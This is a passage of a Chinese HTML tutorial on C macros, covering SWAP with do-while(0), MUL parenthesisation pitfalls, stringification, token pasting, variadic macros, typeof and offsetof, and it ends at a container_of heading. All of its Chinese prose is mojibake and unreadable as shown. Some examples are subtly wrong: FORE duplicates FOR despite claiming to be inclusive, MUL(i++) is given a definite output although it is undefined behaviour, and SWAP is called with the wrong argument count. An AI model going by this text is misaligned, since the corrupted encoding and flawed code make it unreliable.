<li>æ˜¯æ–‡æœ¬ä¸æ”¯æŒè°ƒè¯•
å› æ­¤å¯¹äºå¦‚æœä½ æƒ³ä½¿ç”¨å¸¸é‡æˆ‘çš„å»ºè®®è¿˜æ˜¯ä½¿ç”¨constå…³é”®å­—å®šä¹‰ï¼Œæœ‰ç±»å‹ï¼Œå¯è°ƒè¯•ï¼Œæœ‰å†…å­˜åˆ†é…ï¼Œæœ‰ä½œç”¨åŸŸ
é‚£æœ‰çš„äººå°±é—®äº†é‚£åˆç€ç™½çœ‹æ¥ç›´æ¥ç”¨constå°±ä¸€åŠ³æ°¸é€¸äº†ï¼Œä½†æ˜¯æ³¨æ„ä¸Šé¢åªæ˜¯å®å¯¹è±¡å®šä¹‰ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºå®å®šä¹‰çš„ç²¾é«“å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯<strong>å®å‡½æ•°å®šä¹‰</strong>æ¥ä¸‹æ¥æˆ‘ä»¬ä¸€èµ·æ¥çœ‹</li>
</ol>
<h3 data-id="heading-3">2.å®çš„å‡½æ•°å®šä¹‰</h3>
<p><strong>æ ¼å¼ï¼š</strong> #define å‡½æ•°å(å‚æ•°åˆ—è¡¨) å®ç°</p>
<p><strong>ä¾‹å¦‚ï¼š</strong> #define MAX(a,b) ((a)&gt;(b))?(a):(b)</p>
<p><em><strong>æ³¨æ„å‡½æ•°åå’Œå‚æ•°åˆ—è¡¨ä¹‹é—´æ— ç©ºæ ¼ï¼Œç©ºæ ¼åœ¨å®ç°å’Œå‚æ•°åˆ—è¡¨ä¹‹é—´</strong></em>
ä¸Šé¢çš„ä»£ç å°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªå®å®šä¹‰çš„æ¯”è¾ƒæœ€å¤§çš„å‡½æ•°ï¼Œå¯èƒ½æœ‰çš„æœ‹å‹æ„Ÿè§‰å—¯â€¦â€¦è¿™æˆ‘è‡ªå·±å®šä¹‰ä¸€ä¸ªå‡½æ•°ä¸æ˜¯ä¹Ÿå¯ä»¥å—ï¼Ÿä¸ºä»€ä¹ˆè¿˜å†™å®å®šä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬è®°ä½å®å®šä¹‰çš„ç‰¹ç‚¹æ˜¯<strong>æ–‡æœ¬æ›¿æ¢</strong>ï¼Œæ³¨æ„è¿™ä¸ªæ€§è´¨å°±ä¿è¯äº†å®ƒæœ‰å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„æ•ˆæœ</p>
<h4 data-id="heading-4">æ³›å‹ç¼–ç¨‹çš„ä½¿ç”¨</h4>
<p>æ³›å‹å°±æ˜¯ä»€ä¹ˆç±»å‹éƒ½æ”¯æŒçš„æ„æ€ï¼Œå¯¹äºä¸€ä¸ªå‡½æ•°swapäº¤æ¢å‡½æ•°å¦‚æœæˆ‘ä»¬ä½¿ç”¨æ™®é€šå‡½æ•°å®ç°ä½ ä¼šå‘ç°æˆ‘å¿…é¡»æ˜¯ä¸‹é¢è¿™æ ·,<strong>å£°æ˜å¥½å‚æ•°ç±»å‹</strong>ç„¶å<strong>åªèƒ½ä½¿ç”¨è€…è¿™ä¸ªç±»å‹</strong>ï¼Œé‚£å¦‚æœä½ æœ‰å¤šç§ç±»å‹çš„äº¤æ¢å‘¢å®šä¹‰swap_int,swap_double?</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;
</code></pre>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹å®å®šä¹‰ï¼Œå®å®šä¹‰æ˜¯æ–‡æœ¬æ›¿æ¢å°±æ˜¯ç®€å•æŠŠä½ ç»™çš„å€¼ä¼ é€’è¿‡å»ï¼Œä¸éœ€è¦ç®¡ç±»å‹æˆ‘ä»€ä¹ˆç±»å‹éƒ½èƒ½ä¼ é€’ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¿™ä¸ªSWAPæ‰€æœ‰ç±»å‹å¯ç”¨ä¾‹å¦‚è¯´ä¸‹é¢çš„ä»£ç </p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span>Â SWAP(type,a,b)Â do{\Â Â   </span>
Â Â Â Â Â typeÂ temp=a;\  
Â Â Â Â Â a=b;\  
Â Â Â Â b=temp;\  
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)  
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
Â Â Â Â <span class="hljs-type">int</span>Â a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;  
Â Â Â Â SWAP(<span class="hljs-type">int</span>,a,b);  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%dÂ %d"</span>,a,b);  
}
</code></pre>
<ol>
<li>å› ä¸ºå®å®šä¹‰éœ€è¦æ˜¯å†™åœ¨ä¸€è¡Œä½ åŠ ä¸Š\å…¶å®æ„æ€å°±ç±»ä¼¼ä»£è¡¨è¿™ä¸€è¡Œæ²¡ç»“æŸè¡”æ¥ä¸‹é¢</li>
<li>typeæ˜¯ä½ ä¼ é€’è¿‡æ¥çš„ç±»å‹
å¯ä»¥å°è¯•ç…§ç€å†™è¯•ä¸€ä¸‹ï¼Œdo-while(0){}ä¸€ä¼šå†çœ‹</li>
</ol>
<h4 data-id="heading-5">æ€è€ƒå°é—®</h4>
<p>æ³¨æ„ä¸ºä»€ä¹ˆæ˜æ˜æˆ‘çš„è¿™ä¸ªå®å®šä¹‰å‡½æ•°æˆ‘<strong>ä¼ é€’çš„æ˜¯å€¼</strong>ä¹Ÿä¼šæ›´æ”¹å‘¢ä¸æ˜¯è¯´å‡½æ•°ä¸­å€¼ä¼ é€’ä¸æ›´æ”¹å€¼å—ï¼Ÿ
å› ä¸ºè¿™ä¸ªåœ°æ–¹ä¸æ˜¯å‡½æ•°è°ƒç”¨æˆ‘ä»¬åœ¨é‡å¤ä¸€éå®å®šä¹‰æœ¬è´¨æ˜¯<strong>æ–‡æœ¬æ›¿æ¢</strong>ä¹Ÿå°±æ˜¯è¯´å…¶å®æˆ‘ä»¬ä»£ç å˜æˆäº†è¿™ä¸ªæ ·å­</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
Â Â Â Â <span class="hljs-type">int</span>Â a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;  
Â Â Â Â <span class="hljs-keyword">do</span>{  
Â Â Â Â Â Â Â Â <span class="hljs-type">int</span>Â temp=a;  
Â Â Â Â Â Â Â Â a=b;  
Â Â Â Â Â Â Â Â b=temp;  
Â Â Â Â }<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>);  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%dÂ %d"</span>,a,b);  
}
</code></pre>
<p>å¦‚æœæœ‰æ¯”è¾ƒç»†å¿ƒçš„å…„å¼Ÿå°±ä¼šå‘ç°äº†ï¼Œè¿™ä¸ªdo-while(0)çš„ä½œç”¨å¦™ä¸å¯è¨€äº†,æˆ‘do-while(0);æœ¬èº«è¯­æ³•æ˜¯éœ€è¦;ç»“å°¾çš„å®å®šä¹‰ä¸­æ²¡æœ‰å†™è¿™ä¸ª;è¿™é‡Œåˆšåˆšå¥½è¡¥ä¸Šäº†,å¯èƒ½æœ‰äººå°±ä¼šè¯´é‚£ä½ æœ¬èº«ä¸ç”¨è¿™ä¸ªdo-while(0)ç”¨æ‹¬å·ä¸å°±å¥½äº†å—ï¼Ÿä½†æ˜¯å¦‚æœç”¨æ‹¬å·æˆ‘ä»¬æ¥çœ‹å‡è®¾ä¸‹é¢çš„æƒ…å†µ</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">if</span>(cond)
SWAP(a,b);<span class="hljs-comment">//</span>
<span class="hljs-keyword">else</span>
...
<span class="hljs-comment">//æ–‡æœ¬æ›¿æ¢å±•å¼€</span>
<span class="hljs-keyword">if</span>(cond)<span class="hljs-comment">//æ­¤å¤„æˆ‘ä»¬å°†è¿™ä¸ªdo-while(0)æ¢æˆæ‹¬å·</span>
{
};<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªåˆ†å·ä¼šæ–­å¼€åé¢çš„elseï¼Œä½¿ç”¨do-while(0)å°±èƒ½å¸æ”¶äº†è¿™ä¸ª;</span>
<span class="hljs-keyword">else</span>
...
</code></pre>
<p>å¯èƒ½æœ‰çš„åŒå­¦æ„Ÿè§‰æ²¡é—®é¢˜æˆ‘if{}ä¸å°±å¯ä»¥äº†å—ï¼Œä½†æ˜¯è¿™ä¸ªå®å®šä¹‰å¯èƒ½ä¸æ­¢ä½ ä¸€ä¸ªç”¨æœ‰çš„äººå°±æ˜¯å–œæ¬¢ä½¿ç”¨if SWAP(a,b);ç„¶åä»–é€»è¾‘å®Œå…¨æ²¡é—®é¢˜ï¼Œä½†æ˜¯è¿™ä¸ªé”™è¯¯ä»–ä¼šä¸€ç›´æ‰¾ä¸åˆ°</p>
<p><strong>å› æ­¤æ³¨æ„å®å®šä¹‰æ˜¯æ–‡æœ¬æ›¿æ¢æ— æ³•è°ƒè¯•ï¼Œè™½ç„¶å¯ä»¥å¾ˆå¥½è§£å†³æ³›å‹é—®é¢˜ä½†æ˜¯è¦ä¸¥è°¨ä¸¥è°¨ï¼Œæœ‰å¤šæ¡è¯­å¥å°±ä½¿ç”¨do-while(0)</strong>
å½“ç„¶é™¤äº†è¿™ä¸ªå®å®šä¹‰è¿˜æœ‰ä¸€äº›åˆ«çš„æ¯›ç—…ï¼Œå®å®šä¹‰å› ä¸ºå…¶æœ¬è´¨å…¶å®æ˜¯æ–‡æœ¬æ›¿æ¢ï¼Œå› æ­¤ç»å¸¸ä¼šè§¦å‘äºŒä¹‰æ€§
####å®å®šä¹‰äºŒä¹‰æ€§é—®é¢˜(å¸¸è€ƒ)</p>
<h5 data-id="heading-6">å‚æ•°æœªåŠ æ‹¬å·</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) x*x</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<p>è¿è¡Œç»“æœä¸º19ï¼Œå› ä¸ºæˆ‘ä»¬ç›´æ¥æ–‡æœ¬æ›¿æ¢x<em>xä¼šå˜æˆ9+1</em>9+1=19 ä¿®æ”¹æˆä¸‹é¢å½¢å¼å³å¯,(<strong>æ³¨æ„æˆ‘ä»¬ä¸Šé¢çš„ä»£ç å°±æ²¡åŠ ï¼Œä¸Šé¢ä¸åŠ æ˜¯è¾ƒå°‘ç¹çå†…å®¹å…ˆå¸®åŠ©å¤§å®¶ç†è§£</strong>)</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) (x)*(x)</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<h5 data-id="heading-7">å‚æ•°åŠ ä¸Šä½†æ˜¯æ•´ä½“æœªåŠ </h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) (x)*(x)</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-number">200</span>/<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));<span class="hljs-comment">//è¾“å‡ºä¸º200</span>
}
</code></pre>
<p>æœ¬æ¥ç»“æœåº”è¯¥æ˜¯2ï¼Œä½†æ˜¯å› ä¸ºåªæ˜¯æ–‡æœ¬æ›¿æ¢ä¼šå˜æˆ200/(9+1) <em>(9+1)ç»“æœå°±æ˜¯å…ˆ/10å</em>10å¤§å°ä¸å˜ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æ•´ä½“åŠ ä¸Š()å˜æˆ200/((9+1)**(9+1))ï¼›</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) ((x)*(x))</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-number">200</span>/<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<h5 data-id="heading-8">è™½ç„¶éƒ½åŠ ä¸Šäº†æ‹¬å·ä½†æ˜¯å› ä¸ºæ“ä½œå¯¼è‡´é—®é¢˜</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) ((x)*(x))</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span>(i&lt;=<span class="hljs-number">5</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,<span class="hljs-built_in">MUL</span>(i++));<span class="hljs-comment">//è¾“å‡º2 12 30,ä¸ºä»€ä¹ˆä¸æ˜¯5æ¬¡i*iå› ä¸ºæ¯æ¬¡å…¶å®i++ä¼šæ‰§è¡Œä¸¤æ¬¡</span>
    }
}
</code></pre>
<p>å› æ­¤ä¸€äº›å»ºè®®å¯¹äºå®å®šä¹‰</p>
<ol>
<li>æ¯ä¸ªå‚æ•°åŠ ä¸Šè¿™ä¸ª()é¿å…è¸©å‘</li>
<li>ä½¿ç”¨do-while()</li>
<li>ä¸è¦åœ¨ä¼ å‚æ•°çš„æ—¶å€™è¿ç®—
å®å®šä¹‰çš„æ–‡æœ¬æ›¿æ¢é™¤äº†è§£å†³äº†æ³›å‹é—®é¢˜å…¶å®åœ¨è¿™ä¸ªè®¾è®¡ä¸Šä¹Ÿæœ‰å¸®åŠ©(ä¸‹æœŸç»“åˆä¾‹å­è¯´)ï¼Œå…¶æ¬¡å°±æ˜¯è¿™ä¸ªç¼–ç¨‹çš„æŠ€å·§</li>
</ol>
<h4 data-id="heading-9">æŠ€å·§</h4>
<p>æ ¹æ®æ–‡æœ¬æ›¿æ¢çš„ç‰¹ç‚¹æˆ‘ä»¬å¯ä»¥å·å¾ˆå¤šæ‡’æ¯”å¦‚è¯´å¸¸ç”¨çš„forå¾ªç¯æ¯æ¬¡éƒ½å†™ä¸‰å‚æ•°å¤ªéº»çƒ¦äº†,Printfæ¯æ¬¡å†™ç€å¤ªéº»çƒ¦äº†éƒ½å¯ä»¥å®å®šä¹‰å®ç°(æ³¨æ„è¿™æ ·å¯èƒ½å¯¼è‡´åˆ«äººå¾ˆéš¾çœ‹ä½ çš„ä»£ç )ï¼Œæ•ˆæœè¿è¡Œä¸€ä¸‹ä½ å°±çŸ¥é“äº†ï¼ŒåŒ…é‚ªä¿®çš„</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span>Â FOR(n)Â for(intÂ i=0;i&lt;(n);i++)Â <span class="hljs-comment">//forå¾ªç¯ä¸å–ç­‰  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span>Â FORE(n)Â for(intÂ i=0;i&lt;(n);i++)Â <span class="hljs-comment">//å–ç­‰  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span>Â Printf(n,ch)Â printf(<span class="hljs-string">"%d%c"</span>,(n),(ch))<span class="hljs-comment">//ç»™è¿™ä¸ªæ•°ä»¥åŠç”¨ä»€ä¹ˆéš”å¼€  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span>Â Scanf(n)Â scanf(<span class="hljs-string">"%d"</span>,&amp;(n))  </span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
Â Â Â Â <span class="hljs-type">int</span>Â n;  
Â Â Â Â Scanf(n);  
Â Â Â Â FOR(n){  
Â Â Â Â Â Â Â Â Printf(i,<span class="hljs-string">'Â '</span>);  
Â Â Â Â }  
Â Â Â Â FORE(n){  
Â Â Â Â Â Â Â Â Printf(i,<span class="hljs-string">'\n'</span>);  
Â Â Â Â }  
}
</code></pre>
<h2 data-id="heading-10">å®å®šä¹‰æå‡</h2>
<h3 data-id="heading-11">å®ä½¿ç”¨æŠ€å·§</h3>
<h4 data-id="heading-12">1. <strong>å­—ç¬¦ä¸²åŒ–ï¼ˆStringificationï¼‰ï¼š<code>#</code> æ“ä½œç¬¦</strong></h4>
<p>å°†å®å‚æ•°è½¬ä¸ºå­—ç¬¦ä¸²å­—é¢é‡ï¼šåœ¨å‚æ•°å‰é¢å‡è®¾#ä¼šè®©å®ƒå˜æˆå­—é¢é‡ä¹Ÿå°±æ˜¯æ¯”å¦‚ä½ ä¼ å…¥ageä¸åœ¨æ˜¯ageå¯¹åº”çš„å€¼è€Œæ˜¯"age"ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_INT(x) printf(#x <span class="hljs-string">" = %d\n"</span>, x)</span>

PRINT_INT(age); <span class="hljs-comment">// å±•å¼€ä¸ºï¼šprintf("age" " = %d\n", age);</span>
                <span class="hljs-comment">// è¾“å‡ºï¼šage = 25</span>
</code></pre>
<h4 data-id="heading-13">2. <strong>è¿æ¥ç¬¦ï¼ˆToken Pastingï¼‰ï¼š<code>##</code> æ“ä½œç¬¦</strong></h4>
<p>æ‹¼æ¥ tokenï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_ADDR(base, offset) (base ## _BASE + offset)</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> GPIOA_BASE 0x40020000</span>

<span class="hljs-type">uint32_t</span> addr = REG_ADDR(GPIOA, <span class="hljs-number">0x00</span>); <span class="hljs-comment">// â†’ GPIOA_BASE + 0x00</span>
</code></pre>
<h4 data-id="heading-14">3. <strong>å¯å˜å‚æ•°å®ï¼ˆVariadic Macrosï¼ŒC99ï¼‰</strong></h4>
<p>å¯ä»¥ä½¿ç”¨...ä»£è¡¨å¯å˜å‚æ•°(ä¸ç¡®å®šç±»å‹ä¸ªæ•°ä½ æƒ³æ€ä¹ˆä¼ æ€ä¹ˆä¼ ),##__VA_ARGS__å±•å¼€è¿™ä¸ªå‚æ•°</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG(fmt, ...) printf(<span class="hljs-string">"[LOG] "</span> fmt <span class="hljs-string">"\n"</span>, ##__VA_ARGS__)</span>

LOG(<span class="hljs-string">"Error: %s"</span>, strerror(errno));
</code></pre>
<blockquote>
<p>ğŸ”¸ <code>##__VA_ARGS__</code> æ˜¯ GCC æ‰©å±•ï¼Œç”¨äºå¤„ç†ç©ºå‚æ•°æƒ…å†µã€‚</p>
</blockquote>
<h4 data-id="heading-15">typeof è‡ªåŠ¨æ¨å¯¼ç±»å‹æ ¹æ®æˆ‘ä»¬ä¼ å…¥å‚æ•°æ¨å¯¼è¿™ä¸ªç±»å‹</h4>
<p>å¯ä»¥æ›´æ”¹æˆ‘ä»¬ä¸Šé¢çš„SWAPå‡½æ•°</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>Â SWAP(a,b)Â do{\  </span>
typeof(a)Â tempÂ =Â (a);Â \  
(a)=Â (b);Â \  
(b)Â =Â temp;Â \  
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-16">å¸¸ç”¨ç³»ç»Ÿå®å®šä¹‰</h3>



































<table><thead><tr><th>å®</th><th>å«ä¹‰</th><th>å…¸å‹ç”¨é€”</th></tr></thead><tbody><tr><td><code>__FILE__</code></td><td>å½“å‰æºæ–‡ä»¶å</td><td>é”™è¯¯å®šä½</td></tr><tr><td><code>__LINE__</code></td><td>å½“å‰è¡Œå·</td><td>å´©æºƒè¿½è¸ª</td></tr><tr><td><code>__func__</code></td><td>å½“å‰å‡½æ•°å</td><td>æ—¥å¿—æ‰“å°</td></tr><tr><td><code>__DATE__</code></td><td>ç¼–è¯‘æ—¥æœŸ</td><td>å›ºä»¶ä¿¡æ¯</td></tr><tr><td><code>__TIME__</code></td><td>ç¼–è¯‘æ—¶é—´</td><td>ç‰ˆæœ¬è¿½è¸ª</td></tr></tbody></table>
<h3 data-id="heading-17">container_ofå†…æ ¸ç»å…¸å®(é‡ç‚¹ï¼‰</h3>
<h4 data-id="heading-18">ä¸ºä»€ä¹ˆéœ€è¦åæ¨ç»“æ„ä½“å‘¢ï¼Ÿ</h4>
<h5 data-id="heading-19">ç‰¹æ®Šæƒ…å†µçš„æ•°æ®æŸ¥æ‰¾</h5>
<p>æˆ‘è‡ªå·±æƒ³çš„å¯ä»¥ä¸ç”¨ç®¡
ä¸¾ä¸€ä¸ªä¾‹å­ï¼šæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå•†å“é“¾è¡¨ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªå•†å“çš„å½’å±è€…ã€‚ä¸ºä»€ä¹ˆä¼šé€šè¿‡å•†å“åæ¨å½’å±è€…ï¼Œè€Œéä»æ¯ä¸ªç”¨æˆ·é‡ŒæŸ¥æ‰¾è¯¥å•†å“æ˜¯å¦å±äºä»–ï¼Ÿ å› ä¸ºä»ç”¨æˆ·ä¾§æŸ¥æ‰¾éœ€è¦éå†æ¯ä¸ªç”¨æˆ·çš„å•†å“åˆ—è¡¨ï¼Œå³ä¾¿åšæˆæ™®é€šé“¾è¡¨ï¼ŒæŸ¥æ‰¾æ•ˆç‡ä¹Ÿä¸€èˆ¬ï¼›ä½†å¦‚æœæ˜¯<strong>å¸¦åˆ†ç±»çš„é“¾è¡¨</strong>ï¼ˆç±»ä¼¼æ•°æ®åº“çš„ç´¢å¼•è®¾è®¡ï¼‰ï¼ŒæŠŠå•†å“é“¾è¡¨å…ˆæŒ‰ç±»å‹åˆ†ç±»ã€å†æŒ‰å“ç‰Œç»†åˆ†ï¼Œæ¯ä¸ªå­é“¾è¡¨çš„è§„æ¨¡ä¼šå¤§å¹…ç¼©å°ã€‚ ç®€å•æ¥è¯´ï¼Œå¯¹å†…å®¹åšåˆ†ç±»åï¼Œèƒ½å¿«é€Ÿå®šä½åˆ°å¯¹åº”ç±»å‹çš„å­é“¾è¡¨ï¼Œåœ¨å°èŒƒå›´å†…æŸ¥æ‰¾å•†å“åï¼Œå†åæ¨å…¶å½’å±è€…ï¼ŒæŸ¥æ‰¾æ•ˆç‡ä¼šå¤§å¹…æå‡ã€‚</p>
<h4 data-id="heading-20">å†…æ ¸æˆ–è€…ç³»ç»Ÿè®¾è®¡çš„å°è£…ã€éš”ç¦»ã€æƒé™è®¾è®¡</h4>
<h5 data-id="heading-21">1. ä¸ºäº†æ¥å£çš„é€šç”¨æ€§</h5>
<p>æ¯”å¦‚å®ç°ä¸€ä¸ªå®šæ—¶å™¨å‡½æ•°ï¼Œé¢å¯¹å¤šä¸ªä¸åŒè®¾å¤‡ï¼ˆç”µæœºã€LEDã€ä¼ æ„Ÿå™¨ï¼‰ï¼Œä¸å¯èƒ½ä¸ºæ¯ä¸ªè®¾å¤‡å•ç‹¬å†™ä¸€ä¸ªå®šæ—¶å™¨å‡½æ•°ï¼Œåªèƒ½<strong>ç»Ÿä¸€æ¥å£å¹¶ä¼ å…¥å…¬å…±éƒ¨åˆ†</strong>ï¼›è€Œå®é™…ä½¿ç”¨è®¾å¤‡æ—¶ï¼Œå°±éœ€è¦ä»å®šæ—¶å™¨ç»“æ„ä½“åæ¨åˆ°å¯¹åº”çš„è®¾å¤‡ç»“æ„ä½“ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">timer_expire</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_node *node)</span>{<span class="hljs-comment">//ä¼ å…¥è®¾å¤‡çš„æ—¶é—´ä¸Šçš„ç»“æ„ä½“</span>
  active(device);<span class="hljs-comment">//æ—¶é—´åˆ°äº†æ¿€æ´»è®¾å¤‡</span>
}
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Motor</span> {</span>
    <span class="hljs-type">int</span> speed;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LED</span> {</span>
    <span class="hljs-type">int</span> brightness;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sensor</span> {</span>
    <span class="hljs-type">int</span> value;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

</code></pre>
<h5 data-id="heading-22">2. æƒé™ä¿æŠ¤ï¼ˆæ ¸å¿ƒæ˜¯éš”ç¦»ï¼‰</h5>
<p>è¿˜æ˜¯ä¸Šé¢çš„å®šæ—¶å™¨ä¾‹å­ï¼Œå®šæ—¶å™¨æ¨¡å—æœ¬å°±ä¸åº”è¯¥è®¿é—®è®¾å¤‡çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™æ ·åšä¼šå­˜åœ¨ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼Œé€šè¿‡åªä¼ å…¥å…¬å…±çš„å®šæ—¶å™¨ç»“æ„ä½“ï¼Œèƒ½ä¸¥æ ¼éš”ç¦»æ¨¡å—çš„è®¿é—®æƒé™ã€‚</p>
<h3 data-id="heading-23">âœ… é¢è¯•ç»å…¸é¢˜ï¼šæ‰‹å†™container_ofå®ç°ï¼Ÿ</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> my_offsetof(type, member) ((size_t)&amp;((type*)0)-&gt;member) </span>
</code></pre>
<h4 data-id="heading-24">åˆ†æ­¥éª¤ç†è§£æ ¸å¿ƒé€»è¾‘</h4>
<ol>
<li><code>(type*)0</code>ï¼šå‡è®¾å°†ä¸€ä¸ª<code>type</code>ç±»å‹çš„ç»“æ„ä½“ï¼Œå¼ºè¡Œæ”¾ç½®åœ¨å†…å­˜åœ°å€<strong>0</strong>çš„ä½ç½®ï¼›</li>
<li><code>((type*)0)-&gt;member</code>ï¼šè®¿é—®è¿™ä¸ªè™šæ‹Ÿç»“æ„ä½“ä¸­çš„<code>member</code>æˆå‘˜ï¼›</li>
<li><code>&amp;((type*)0)-&gt;member</code>ï¼šå–è¯¥æˆå‘˜çš„å†…å­˜åœ°å€â€”â€”å› ä¸ºç»“æ„ä½“ä»0åœ°å€å¼€å§‹ï¼Œæˆå‘˜çš„åœ°å€å€¼å°±æ˜¯å®ƒç›¸å¯¹äºç»“æ„ä½“é¦–åœ°å€çš„<strong>åç§»é‡</strong>ã€‚
<strong>é€šä¿—ä¸¾ä¾‹</strong>ï¼š çŸ¥é“æˆ‘çš„ä½ç½®<code>x</code>ã€ä½ çš„ä½ç½®<code>y</code>æœªçŸ¥ï¼Œæƒ³æ±‚å½¼æ­¤çš„è·ç¦»ï¼ˆåç§»é‡ï¼‰ã€‚ä¿æŒè·ç¦»ä¸å˜ï¼ˆç»“æ„ä½“æˆå‘˜åç§»é‡å›ºå®šï¼‰ï¼Œè®©ä½ ç«™åˆ°0çš„ä½ç½®ï¼Œæ­¤æ—¶æˆ‘çš„ä½ç½®<code>x</code>å°±æ˜¯æˆ‘ä»¬ä¹‹é—´çš„è·ç¦»ï¼Œè¿™å°±æ˜¯<code>offsetof</code>çš„æ ¸å¿ƒæ€æƒ³ã€‚</li>
</ol>
<h3 data-id="heading-25">Linux å†…æ ¸ç»å…¸å®ï¼š<code>container_of</code></h3>
